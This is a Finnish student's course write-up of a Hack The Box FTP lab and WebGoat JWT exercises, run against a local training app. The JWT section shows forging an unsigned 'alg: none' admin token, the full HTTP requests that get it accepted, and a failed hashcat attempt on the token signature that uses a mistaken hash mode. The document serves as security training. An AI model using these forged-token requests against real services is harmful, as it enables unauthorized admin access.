Kurssin viimeisenä tehtävänä on listata `Bonus tehtäviä` jotka on tullut tehtyä kurssin aikana.

Minä en paljon vapaaehtoisia ja extra tehtäviä kurssin aikana kerennyt tehdä. Mutta muutama kuitenkin.

## Hack the box Labs

![image](https://github.com/FredrikAkerlund/Starting-pentesting/assets/122887178/bc6b86f1-5e6b-4892-b9e1-645a8a7981fd)

Tein ensimmäisen HackTheBox labin. CTF oli erittäin helppo ja tehtävässä oli tarkoitus harjoitella FTP yhteyden heikkouksia. Tehtävässä käytännössä piti löytää FTP palvelin NMAP avulla jonka jälkeen piti ottaa FTP yhteys siihen palvelimeen. Palvelimelta piti löytää selkokielellä talletettu salasana. Erittäin helppo.


**Webgoat JWT tokens**

Tein Webgoatissa tehtävän missä oli tarkoitus kaapata ja muuttaa JWT tokeni. Alla ote raportista.

Raportin lähde: https://github.com/FredrikAkerlund/Starting-pentesting/blob/main/h5%20Legit%20Certificate.md#webgoat-teht%C3%A4v%C3%A4t

JWT tokens

Ensimmäisenä tehtävänä on dekoodata JWT tokeni. JWT tokenit on koodattu Base64 koodauksella. Käytän Pencode ohjelmaa sen dekoodamiseen. Webgoat oppaissa lukee että JWT tokeni on jaettu kolmeen osaan ja erittäjänä toimii ..

Eka osa on Header osa:

    ┌──(kynaniska㉿kynaniska)-[~/webgoat]
    └─$ echo 'eyJhbGciOiJIUzI1NiJ9'|pencode b64decode
    {"alg":"HS256"}     
Toka osa on "claims":

    ┌──(kynaniska㉿kynaniska)-[~/webgoat]
    └─$ echo 'ew0KICAiYXV0aG9yaXRpZXMiIDogWyAiUk9MRV9BRE1JTiIsICJST0xFX1VTRVIiIF0sDQogICJjbGllbnRfaWQiIDogIm15LWNsaWVudC13aXRoLXNlY3JldCIsDQogICJleHAiIDogMTYwNzA5OTYwOCwNCiAgImp0aSIgOiAiOWJjOTJhNDQtMGIxYS00YzVlLWJlNzAtZGE1MjA3NWI5YTg0IiwNCiAgInNjb3BlIiA6IFsgInJlYWQiLCAid3JpdGUiIF0sDQogICJ1c2VyX25hbWUiIDogInVzZXIiDQp9' |pencode b64decode
    {
      "authorities" : [ "ROLE_ADMIN", "ROLE_USER" ],
      "client_id" : "my-client-with-secret",
      "exp" : 1607099608,
      "jti" : "9bc92a44-0b1a-4c5e-be70-da52075b9a84",
      "scope" : [ "read", "write" ],
      "user_name" : "user"
    }           
Sieltähän löytyy kivaa tietoja. Vastaus on user.

Tehtävässä 5 on tarkoitus on vaihtaa tokeni ADMIN käyttäjäksi.

Ensiksi puran jerry käyttäjän tokenin ja katson että se on allekirjoitettu:

    eyJhbGciOiJIUzUxMiJ9.eyJpYXQiOjE3MTU2OTc5NDgsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiSmVycnkifQ.TSnOjrxkmXgyWSmHCRV37-vI27vmd5sC9isbwmrapivUCSo1E6HBWj2yuvAL8eRf7vIYLz62ZBhoVpAnt0B9Jw

    ┌──(kynaniska㉿kynaniska)-[~/webgoat]
    └─$ echo 'eyJhbGciOiJIUzUxMiJ9' |pencode b64decode
    {"alg":"HS512"} 
Toiseen osaan saan kuitenkin virheen:

    ┌──(kynaniska㉿kynaniska)-[~/webgoat]
    └─$ echo 'eyJpYXQiOjE3MTU2OTc5NDgsImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiSmVycnkifQ'|pencode b64decode
      [!] illegal base64 data at input byte 64
Tätä jäin ihmettelemään ja löysin hyödyllisen sivun missä selitetään JWT tokenit tarkemmin: https://pvxs.medium.com/webgoat-jwt-tokens-4-5-ff5bd88e76f

Sivustolla löytyy vastaus tehtävään mutta pyrin olemaan käyttämättä sitä. Ongelma kun yritön dekoodata JWT tokenin on että minun pitää lisätä = tokenin toisen osan loppuun. Silloin se palauttaa JSON tiedoston oikeassa muodossa.

    ┌──(kynaniska㉿kynaniska)-[~/webgoat]
    └─$ echo 'eyJpYXQiOjE3MTU2OTg4NTksImFkbWluIjoiZmFsc2UiLCJ1c2VyIjoiVG9tIn0=' |pencode b64decode                      
    {"iat":1715698859,"admin":"false","user":"Tom"}
Sitten vielä dekodaan viimeisen osan:

    ┌──(kynaniska㉿kynaniska)-[~/webgoat]
    └─$ echo '4rGJaawJ54gLSvEHoWWnVwWfcgHSjYsC2-YtRmVFSBhwReaAXFTFKCEoz-WIQ1H9Aln4jnIMV8iel503wuJjIQ='|pencode b64decode
      [!] illegal base64 data at input byte 33
Eli minun on nyt tarkoitus lähettää POST pyyntö missä on Algorithmi = null ja käyttäjän tiedot muutettu. Teen JSON tiedoston ja muunnan sen koodaan sen base64 muotoon:

    ┌──(kynaniska㉿kynaniska)-[~/webgoat]
    └─$ echo '{"alg":"none"}' |pencode b64encode
    eyJhbGciOiJub25lIn0=                                                                                                                                                        
                                                                                                                                       
    ┌──(kynaniska㉿kynaniska)-[~/webgoat]
    └─$ echo '{"iat":1715698859,"admin":"true","user":"Tom"}' |pencode b64encode
    eyJpYXQiOjE3MTU2OTg4NTksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ==   
Lopputulokseni tokenista:

    eyJhbGciOiJub25lIn0=.eyJpYXQiOjE3MTU2OTg4NTksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ==
Katotaan toimiiko jos lisään tämän POST pyyntöön.

    POST http://localhost:8080/WebGoat/JWT/votings/Admin%20lost%20password HTTP/1.1
    host: localhost:8080
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    X-Requested-With: XMLHttpRequest
    Origin: http://localhost:8080
    Connection: keep-alive
    Referer: http://localhost:8080/WebGoat/start.mvc
    Cookie: access_token=eyJhbGciOiJub25lIn0=.eyJpYXQiOjE3MTU2OTg4NTksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ==; JSESSIONID=WasJvA5WHp6r4wpCyt7Yo66hjUXZY7T74VsBVvLa
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Content-Length: 0
Ei toimi!. Tein pieniä muutoksia tokeniin, Poistin kaikki = merkit ja lisäsin pisteen viimeiseksi.

    POST http://localhost:8080/WebGoat/JWT/votings/Admin%20lost%20password HTTP/1.1
    host: localhost:8080
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    X-Requested-With: XMLHttpRequest
    Origin: http://localhost:8080
    Connection: keep-alive
    Referer: http://localhost:8080/WebGoat/start.mvc
    Cookie: access_token=eyJhbGciOiJub25lIn0.eyJpYXQiOjE3MTU2OTg4NTksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.; JSESSIONID=WasJvA5WHp6r4wpCyt7Yo66hjUXZY7T74VsBVvLa
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Content-Length: 0
Vastauksena sain 202 ACCEPTED:

    HTTP/1.1 202 Accepted
    Connection: keep-alive
    X-XSS-Protection: 1; mode=block
    X-Content-Type-Options: nosniff
    X-Frame-Options: DENY
    Content-Length: 0
    Date: Sat, 04 May 2024 15:27:24 GMT
Tässä tehtävässä käytän myös sivustoa: https://jwt.io/ Base64 dekoodamiseen ja koodamiseen.

En päässy läpi tehtävää koska tarkoitus oli nollata salasanat ADMIN käyttäjänä. Eli lähetin väärää POST pyyntöä. Klickaan reset vote josta saan POST pyynnön. Siihen muutan Acces tokenin juuri luomaani tokeniin joka ei ole allekirjoitettu:

    POST http://localhost:8080/WebGoat/JWT/votings HTTP/1.1
    host: localhost:8080
    User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0
    Accept: */*
    Accept-Language: en-US,en;q=0.5
    Content-Type: application/x-www-form-urlencoded; charset=UTF-8
    X-Requested-With: XMLHttpRequest
    Origin: http://localhost:8080
    Connection: keep-alive
    Referer: http://localhost:8080/WebGoat/start.mvc
    Cookie: access_token=eyJhbGciOiJub25lIn0.eyJpYXQiOjE3MTU2OTg4NTksImFkbWluIjoidHJ1ZSIsInVzZXIiOiJUb20ifQ.; JSESSIONID=WasJvA5WHp6r4wpCyt7Yo66hjUXZY7T74VsBVvLa
    Sec-Fetch-Dest: empty
    Sec-Fetch-Mode: cors
    Sec-Fetch-Site: same-origin
    Content-Length: 0
Ja siihen saan vastauksen:

    {
      "lessonCompleted" : true,
      "feedback" : "Congratulations. You have successfully completed the assignment.",
      "output" : null,
      "assignment" : "JWTVotesEndpoint",
      "attemptWasMade" : true
    }
Melkosta...

JWT Cracking

Tehtävänä on murtaa allekirjoitus tokenista ja muuttaa käyttäjänimi Webgoat:ksi.

Aloitan dekodaamalla Tokeni. Tähän käytän jwt.io sivustoa koska se on helppo ja pencode on aikaa vievämpi.

    {
      "alg": "HS256"
    }
    
    {
      "iss": "WebGoat Token Builder",
      "aud": "webgoat.org",
      "iat": 1714833339,
      "exp": 1714833399,
      "sub": "tom@webgoat.org",
      "username": "Tom",
      "Email": "tom@webgoat.org",
      "Role": [
        "Manager",
        "Project Administrator"
      ]
    }
    
    HMACSHA256(
      base64UrlEncode(header) + "." +
      base64UrlEncode(payload),
      
    your-256-bit-secret
    
    ) secret base64 encoded
Tämän jälkeen lähden murtamaan HMACSHA256 salattua tiivistettä.

    ┌──(kynaniska㉿kynaniska)-[~/webgoat]
    └─$ hashid -m 'bGw6Yo8M1vwkn2SvN9kVLMz8C3J6w8BURAtP2F9f3KU'
    Analyzing 'bGw6Yo8M1vwkn2SvN9kVLMz8C3J6w8BURAtP2F9f3KU'
    [+] Cisco-IOS(SHA-256) [Hashcat Mode: 5700]
    [+] Cisco Type 4 
ELi Haschat mode 5700

    ┌──(kynaniska㉿kynaniska)-[~/webgoat]
    └─$ hashcat -m 5700 '8hx19xAFPfim6VJv17kb85HagyyUJGQHvv0TqHl5LvI' /usr/share/wordlists/ -o solved 
En saa kuitenkaan mitään osumia.

TÄtä ongelmaa hakkasin pitkään ja päätin lopettaa WEBGOAT harjoitteen tähän. Lopettamisen jälkeen tajustin että tämä tehtävä ei ollut edes viikko tehtävissä :D
